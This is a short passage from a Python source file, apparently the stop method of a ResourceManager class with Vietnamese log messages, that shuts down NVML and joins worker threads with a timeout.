                self.logger.warning("Không có shared_resource_manager, bỏ qua tắt NVML.")
        except Exception as e:
            self.logger.error(f"Lỗi khi tắt NVML: {e}")

        # Bước 4. join workers
        for w in self.workers:
            try:
                w.join(timeout=2)
                if w.is_alive():
                    self.logger.warning(f"Thread {w.name} chưa dừng hẳn.")
            except Exception as e:
                self.logger.error(f"Lỗi khi join thread {w.name}: {e}")

        self.logger.info("Dừng ResourceManager... (HOÀN THÀNH)")
